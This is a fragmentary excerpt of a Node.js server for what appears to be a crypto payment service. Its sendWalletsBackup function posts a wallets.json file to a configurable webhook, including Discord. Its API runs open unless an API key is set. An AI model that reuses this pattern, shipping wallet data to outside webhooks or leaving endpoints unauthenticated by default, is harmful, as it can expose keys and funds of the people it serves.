...
app.post('/api/payment', async (req, res) => {
    ...
    if (!['eth', 'eth_native', 'polygon', 'btc'].includes(chain))
        return res.status(400).json({ error: 'chain must be eth, eth_native, polygon, or btc' });
...
async function sendWalletsBackup() {
    ...
    try {
        if (WALLETS_WEBHOOK_URL.includes('discord.com')) {
            ...
            form.append('payload_json', JSON.stringify({ content: `Wallet backup — ${ts}` }));
            form.append('file', new Blob([json], { type: 'application/json' }), 'wallets.json');
            const res = await fetch(WALLETS_WEBHOOK_URL, { method: 'POST', body: form });
...
function start() {
    if (!MNEMONIC) { console.error('PHRASE not set in .env'); process.exit(1); }
    ...
    app.listen(PORT, () => {
        ...
        console.log(`  Auth: ${API_KEY ? 'API key required' : 'open (set API_KEY in .env to enable)'}\n`);
    });
}
